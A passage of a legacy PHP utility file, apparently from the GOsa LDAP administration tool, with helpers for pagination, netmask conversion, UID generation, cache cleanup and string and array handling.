  return $_SESSION[$name];
}


function range_selector($dcnt,$start,$range=25,$post_var=false)
{

  /* Entries shown left and right from the selected entry */
  $max_entries= 10;

  /* Initialize and take care that max_entries is even */
  $output="";
  if ($max_entries & 1){
    $max_entries++;
  }

  if((!empty($post_var))&&(isset($_POST[$post_var]))){
    $range= $_POST[$post_var];
  }

  /* Prevent output to start or end out of range */
  if ($start < 0 ){
    $start= 0 ;
  }
  if ($start >= $dcnt){
    $start= $range * (int)(($dcnt / $range) + 0.5);
  }

  $numpages= (($dcnt / $range));
  if(((int)($numpages))!=($numpages)){
    $numpages = (int)$numpages + 1;
  }
  if ((((int)$numpages) <= 1 )&&(!$post_var)){
    return ("");
  }
  $ppage= (int)(($start / $range) + 0.5);


  /* Align selected page to +/- max_entries/2 */
  $begin= $ppage - $max_entries/2;
  $end= $ppage + $max_entries/2;

  /* Adjust begin/end, so that the selected value is somewhere in
     the middle and the size is max_entries if possible */
  if ($begin < 0){
    $end-= $begin + 1;
    $begin= 0;
  }
  if ($end > $numpages) {
    $end= $numpages;
  }
  if (($end - $begin) < $max_entries && ($end - $max_entries) > 0){
    $begin= $end - $max_entries;
  }

  if($post_var){
    $output.= "<div style='border:1px solid #E0E0E0; background-color:#FFFFFF;'>
      <table summary='' width='100%'><tr><td style='width:25%'></td><td style='text-align:center;'>";
  }else{
    $output.= "<div style='border:1px solid #E0E0E0; background-color:#FFFFFF;'>";
  }

  /* Draw decrement */
  if ($start > 0 ) {
    $output.="  <a href= \"main.php?plug=".validate($_GET['plug'])."&amp;start=".
      (($start-$range))."\">".
      "<img class=\"center\" alt=\"\" src=\"images/back.png\" border=0 align=\"middle\"></a>";
  }

  /* Draw pages */
  for ($i= $begin; $i < $end; $i++) {
    if ($ppage == $i){
      $output.= "<a style=\"vertical-align:middle;background-color:#D0D0D0;\" href=\"main.php?plug=".
        validate($_GET['plug'])."&amp;start=".
        ($i*$range)."\">&nbsp;".($i+1)."&nbsp;</a>";
    } else {
      $output.= "<a style=\"vertical-align:middle;\" href=\"main.php?plug=".validate($_GET['plug']).
        "&amp;start=".($i*$range)."\">&nbsp;".($i+1)."&nbsp;</a>";
    }
  }

  /* Draw increment */
  if($start < ($dcnt-$range)) {
    $output.="  <a href= \"main.php?plug=".validate($_GET['plug'])."&amp;start=".
      (($start+($range)))."\">".
      "<img class=\"center\" alt=\"\" src=\"images/forward.png\" border=\"0\" align=\"middle\"></a>";
  }

  if(($post_var)&&($numpages)){
    $output.= "</td><td style='width:25%;text-align:right;vertical-align:middle;'>&nbsp;"._("Entries per page")."&nbsp;<select style='vertical-align:middle;' name='".$post_var."' onChange='javascript:document.mainform.submit()'>";
    foreach(array(20,50,100,200,"all") as $num){
      if($num == "all"){
        $var = 10000;
      }else{
        $var = $num;
      }
      if($var == $range){
        $output.="\n<option selected='selected' value='".$var."'>".$num."</option>";
      }else{  
        $output.="\n<option value='".$var."'>".$num."</option>";
      }
    }
    $output.=  "</select></td></tr></table></div>";
  }else{
    $output.= "</div>";
  }

  return($output);
}


function apply_filter()
{
  $apply= "";

  $apply= ''.
    '<table summary=""  width="100%"  style="background:#EEEEEE;border-top:1px solid #B0B0B0;"><tr><td width="100%" align="right">'.
    '<input type="submit" name="apply" value="'._("Apply filter").'"></td></tr></table>';

  return ($apply);
}


function back_to_main()
{
  $string= '<br><p class="plugbottom"><input type=submit name="password_back" value="'.
    _("Back").'"></p><input type="hidden" name="ignore">';

  return ($string);
}


function normalize_netmask($netmask)
{
  /* Check for notation of netmask */
  if (!preg_match('/^([0-9]+\.){3}[0-9]+$/', $netmask)){
    $num= (int)($netmask);
    $netmask= "";

    for ($byte= 0; $byte<4; $byte++){
      $result=0;

      for ($i= 7; $i>=0; $i--){
        if ($num-- > 0){
          $result+= pow(2,$i);
        }
      }

      $netmask.= $result.".";
    }

    return (preg_replace('/\.$/', '', $netmask));
  }

  return ($netmask);
}


function netmask_to_bits($netmask)
{
  list($nm0, $nm1, $nm2, $nm3)= split('\.', $netmask);
  $res= 0;

  for ($n= 0; $n<4; $n++){
    $start= 255;
    $name= "nm$n";

    for ($i= 0; $i<8; $i++){
      if ($start == (int)($$name)){
        $res+= 8 - $i;
        break;
      }
      $start-= pow(2,$i);
    }
  }

  return ($res);
}


function recurse($rule, $variables)
{
  $result= array();

  if (!count($variables)){
    return array($rule);
  }

  reset($variables);
  $key= key($variables);
  $val= current($variables);
  unset ($variables[$key]);

  foreach($val as $possibility){
    $nrule= preg_replace("/\{$key\}/", $possibility, $rule);
    $result= array_merge($result, recurse($nrule, $variables));
  }

  return ($result);
}


function expand_id($rule, $attributes)
{
  /* Check for id rule */
  if(preg_match('/^id(:|#)\d+$/',$rule)){
    return (array("\{$rule}"));
  }

  /* Check for clean attribute */
  if (preg_match('/^%[a-zA-Z0-9]+$/', $rule)){
    $rule= preg_replace('/^%/', '', $rule);
    $val= rewrite(preg_replace('/ /', '', strtolower($attributes[$rule])));
    return (array($val));
  }

  /* Check for attribute with parameters */
  if (preg_match('/^%[a-zA-Z0-9]+\[[0-9-]+\]$/', $rule)){
    $param= preg_replace('/^[^[]+\[([^]]+)]$/', '\\1', $rule);
    $part= preg_replace('/^%/', '', preg_replace('/\[.*$/', '', $rule));
    $val= rewrite(preg_replace('/ /', '', strtolower($attributes[$part])));
    $start= preg_replace ('/-.*$/', '', $param);
    $stop = preg_replace ('/^[^-]+-/', '', $param);

    /* Assemble results */
    $result= array();
    for ($i= $start; $i<= $stop; $i++){
      $result[]= substr($val, 0, $i);
    }
    return ($result);
  }

  echo "Error in idgen string: don't know how to handle rule $rule.\n";
  return (array($rule));
}


function gen_uids($rule, $attributes)
{
  global $config;

  /* Search for keys and fill the variables array with all 
     possible values for that key. */
  $part= "";
  $trigger= false;
  $stripped= "";
  $variables= array();

  for ($pos= 0; $pos < strlen($rule); $pos++){

    if ($rule[$pos] == "{" ){
      $trigger= true;
      $part= "";
      continue;
    }

    if ($rule[$pos] == "}" ){
      $variables[$pos]= expand_id($part, $attributes);
      $stripped.= "\{$pos}";
      $trigger= false;
      continue;
    }

    if ($trigger){
      $part.= $rule[$pos];
    } else {
      $stripped.= $rule[$pos];
    }
  }

  /* Recurse through all possible combinations */
  $proposed= recurse($stripped, $variables);

  /* Get list of used ID's */
  $used= array();
  $ldap= $config->get_ldap_link();
  $ldap->cd($config->current['BASE']);
  $ldap->search('(uid=*)');

  while($attrs= $ldap->fetch()){
    $used[]= $attrs['uid'][0];
  }

  /* Remove used uids and watch out for id tags */
  $ret= array();
  foreach($proposed as $uid){

    /* Check for id tag and modify uid if needed */
    if(preg_match('/\{id:\d+}/',$uid)){
      $size= preg_replace('/^.*{id:(\d+)}.*$/', '\\1', $uid);

      for ($i= 0; $i < pow(10,$size); $i++){
        $number= sprintf("%0".$size."d", $i);
        $res= preg_replace('/{id:(\d+)}/', $number, $uid);
        if (!in_array($res, $used)){
          $uid= $res;
          break;
        }
      }
    }

  if(preg_match('/\{id#\d+}/',$uid)){
    $size= preg_replace('/^.*{id#(\d+)}.*$/', '\\1', $uid);

    while (true){
      mt_srand((double) microtime()*1000000);
      $number= sprintf("%0".$size."d", mt_rand(0, pow(10, $size)-1));
      $res= preg_replace('/{id#(\d+)}/', $number, $uid);
      if (!in_array($res, $used)){
        $uid= $res;
        break;
      }
    }
  }

/* Don't assign used ones */
if (!in_array($uid, $used)){
  $ret[]= $uid;
}
}

return(array_unique($ret));
}


function array_search_r($needle, $key, $haystack){

  foreach($haystack as $index => $value){
    $match= 0;

    if (is_array($value)){
      $match= array_search_r($needle, $key, $value);
    }

    if ($index==$key && !is_array($value) && preg_match("/$needle/i", $value)){
      $match=1;
    }

    if ($match){
      return 1;
    }
  }

  return 0;
} 


/* Sadly values like memory_limit are perpended by K, M, G, etc.
   Need to convert... */
function to_byte($value) {
  $value= strtolower(trim($value));

  if(!is_numeric(substr($value, -1))) {

    switch(substr($value, -1)) {
      case 'g':
        $mult= 1073741824;
        break;
      case 'm':
        $mult= 1048576;
        break;
      case 'k':
        $mult= 1024;
        break;
    }

    return ($mult * (int)substr($value, 0, -1));
  } else {
    return $value;
  }
}


function in_array_ics($value, $items)
{
  if (!is_array($items)){
    return (FALSE);
  }

  foreach ($items as $item){
    if (strtolower($item) == strtolower($value)) {
      return (TRUE);
    }
  }

  return (FALSE);
} 


function generate_alphabet($count= 10)
{
  $characters= _("*ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
  $alphabet= "";
  $c= 0;

  /* Fill cells with charaters */
  for ($i= 0; $i<mb_strlen($characters, 'UTF8'); $i++){
    if ($c == 0){
      $alphabet.= "<tr>";
    }

    $ch = mb_substr($characters, $i, 1, "UTF8");
    $alphabet.= "<td><a class=\"alphaselect\" href=\"main.php?plug=".
      validate($_GET['plug'])."&amp;search=".$ch."\">&nbsp;".$ch."&nbsp;</a></td>";

    if ($c++ == $count){
      $alphabet.= "</tr>";
      $c= 0;
    }
  }

  /* Fill remaining cells */
  while ($c++ <= $count){
    $alphabet.= "<td>&nbsp;</td>";
  }

  return ($alphabet);
}


function validate($string)
{
  return (strip_tags(preg_replace('/\0/', '', $string)));
}

function get_gosa_version()
{
  global $svn_revision, $svn_path;

  /* Extract informations */
  $revision= preg_replace('/^[^0-9]*([0-9]+)[^0-9]*$/', '\1', $svn_revision);

  /* Release or development? */
  if (preg_match('%/gosa/trunk/%', $svn_path)){
    return (sprintf(_("GOsa development snapshot (Rev %s)"), $revision));
  } else {
    $release= preg_replace('%^.*/([^/]+)/include/functions.inc.*$%', '\1', $svn_path);
    return (sprintf(_("GOsa $release"), $revision));
  }
}


function rmdirRecursive($path, $followLinks=false) {
  $dir= opendir($path);
  while($entry= readdir($dir)) {
    if(is_file($path."/".$entry) || ((!$followLinks) && is_link($path."/".$entry))) {
      unlink($path."/".$entry);
    } elseif (is_dir($path."/".$entry) && $entry!='.' && $entry!='..') {
      rmdirRecursive($path."/".$entry);
    }
  }
  closedir($dir);
  return rmdir($path);
}

function scan_directory($path,$sort_desc=false)
{
  $ret = false;

  /* is this a dir ? */
  if(is_dir($path)) {

    /* is this path a readable one */
    if(is_readable($path)){

      /* Get contents and write it into an array */   
      $ret = array();    

      $dir = opendir($path);

      /* Is this a correct result ?*/
      if($dir){
        while($fp = readdir($dir))
          $ret[]= $fp;
      }
    }
  }
  /* Sort array ascending , like scandir */
  sort($ret);

  /* Sort descending if parameter is sort_desc is set */
  if($sort_desc) {
    $ret = array_reverse($ret);
  }

  return($ret);
}

function clean_smarty_compile_dir($directory)
{
  global $svn_revision;

  if(is_dir($directory) && is_readable($directory)) {
    // Set revision filename to REVISION
    $revision_file= $directory."/REVISION";

    /* Is there a stamp containing the current revision? */
    if(!file_exists($revision_file)) {
      // create revision file
      create_revision($revision_file, $svn_revision);
    } else {
# check for "$config->...['CONFIG']/revision" and the
# contents should match the revision number
      if(!compare_revision($revision_file, $svn_revision)){
        // If revision differs, clean compile directory
        foreach(scan_directory($directory) as $file) {
          if(($file==".")||($file=="..")) continue;
          if( is_file($directory."/".$file) &&
              is_writable($directory."/".$file)) {
            // delete file
            if(!unlink($directory."/".$file)) {
              print_red("File ".$directory."/".$file." could not be deleted.");
              // This should never be reached
            }
          } elseif(is_dir($directory."/".$file) &&
              is_writable($directory."/".$file)) {
            // Just recursively delete it
            rmdirRecursive($directory."/".$file);
          }
        }
        // We should now create a fresh revision file
        clean_smarty_compile_dir($directory);
      } else {
        // Revision matches, nothing to do
      }
    }
  } else {
    // Smarty compile dir is not accessible
    // (Smarty will warn about this)
  }
}

function create_revision($revision_file, $revision)
{
  $result= false;

  if(is_dir(dirname($revision_file)) && is_writable(dirname($revision_file))) {
    if($fh= fopen($revision_file, "w")) {
      if(fwrite($fh, $revision)) {
        $result= true;
      }
    }
    fclose($fh);
  } else {
    print_red("Can not write to revision file");
  }

  return $result;
}

function compare_revision($revision_file, $revision)
{
  // false means revision differs
  $result= false;

  if(file_exists($revision_file) && is_readable($revision_file)) {
    // Open file
    if($fh= fopen($revision_file, "r")) {
      // Compare File contents with current revision
      if($revision == fread($fh, filesize($revision_file))) {
        $result= true;
      }
    } else {
      print_red("Can not open revision file");
    }
    // Close file
    fclose($fh);
  }

  return $result;
}

function progressbar($percentage,$width=100,$height=15,$showvalue=false)
{
  $str = ""; // Our return value will be saved in this var

  $color  = dechex($percentage+150);
  $color2 = dechex(150 - $percentage);
  $bgcolor= $showvalue?"FFFFFF":"DDDDDD";

  $progress = (int)(($percentage /100)*$width);

  /* Abort printing out percentage, if divs are to small */


  /* If theres a better solution for this, use it... */
  $str = "
    <div style=\" width:".($width)."px; 
    height:".($height)."px;
  background-color:#000000;
padding:1px;\">

          <div style=\" width:".($width)."px;
        background-color:#$bgcolor;
height:".($height)."px;\">

         <div style=\" width:".$progress."px;
height:".$height."px;
       background-color:#".$color2.$color2.$color."; \">";


       if(($height >10)&&($showvalue)){
         $str.=                 "<font style=\"font-size:".($height-2)."px;color:#FF0000;align:middle;padding-left:".((int)(($width*0.4)))."px;\">
           <b>".$percentage."%</b>
           </font>";
       }

       $str.= "</div></div></div>";

       return($str);
}


function array_key_ics($ikey, $items)
{
  /* Gather keys, make them lowercase */
  $tmp= array();
  foreach ($items as $key => $value){
    $tmp[strtolower($key)]= $key;
  }

  if (isset($tmp[strtolower($ikey)])){
    return($tmp[strtolower($ikey)]);
  }

  return ("");
}


function search_config($arr, $name, $return)
{
  if (is_array($arr)){
    foreach ($arr as $a){
      if (isset($a['CLASS']) &&
          strtolower($a['CLASS']) == strtolower($name)){

        if (isset($a[$return])){
          return ($a[$return]);
        } else {
          return ("");
        }
      } else {
        $res= search_config ($a, $name, $return);
        if ($res != ""){
          return $res;
        }
      }
    }
  }
  return ("");
}


function array_differs($src, $dst)
{
  /* If the count is differing, the arrays differ */
  if (count ($src) != count ($dst)){
    return (TRUE);
  }

  /* So the count is the same - lets check the contents */
  $differs= FALSE;
  foreach($src as $value){
    if (!in_array($value, $dst)){
      $differs= TRUE;
    }
  }

  return ($differs);
}


function saveFilter($a_filter, $values)
{
  if (isset($_POST['regexit'])){
    $a_filter["regex"]= $_POST['regexit'];

    foreach($values as $type){
      if (isset($_POST[$type])) {
        $a_filter[$type]= "checked";
      } else {
        $a_filter[$type]= "";
      }
    }
  }

  /* React on alphabet links if needed */
  if (isset($_GET['search'])){
    $s= mb_substr(validate($_GET['search']), 0, 1, "UTF8")."*";
    if ($s == "**"){
      $s= "*";
    }
    $a_filter['regex']= $s;
  }

  return ($a_filter);
}


/* Escape all preg_* relevant characters */
function normalizePreg($input)
{
  return (addcslashes($input, '[]()|/.*+-'));
}


/* Escape all LDAP filter relevant characters */
function normalizeLdap($input)
{
  return (addcslashes($input, '()|'));
}


/* Resturns the difference between to microtime() results in float  */
function get_MicroTimeDiff($start , $stop)
{
  $a = split("\ ",$start);
  $b = split("\ ",$stop);

  $secs = $b[1] - $a[1];
  $msecs= $b[0] - $a[0]; 

  $ret = (float) ($secs+ $msecs);
  return($ret);
}


/* Check if the given department name is valid */
function is_department_name_reserved($name,$base)
{
  $reservedName = array("systems","apps","incomming","internal","accounts","fax","addressbook",
                          preg_replace("/ou=(.*),/","\\1",get_people_ou()),
                          preg_replace("/ou=(.*),/","\\1",get_groups_ou()));
  $follwedNames['/ou=fai,ou=configs,ou=systems,/'] = array("fai","hooks","templates","scripts","disk","packages","variables","profiles");

  /* Check if name is one of the reserved names */
  if(in_array_ics($name,$reservedName)) {
    return(true);
  }

  /* Check all follow combinations if name is in array && parent base == array_key, return false*/
  foreach($follwedNames as $key => $names){
    if((in_array_ics($name,$names)) && (preg_match($key,$base))){
      return(true);
    }
  }
  return(false);
}


// vim:tabstop=2:expandtab:shiftwidth=2:filetype=php:syntax:ruler:
?>
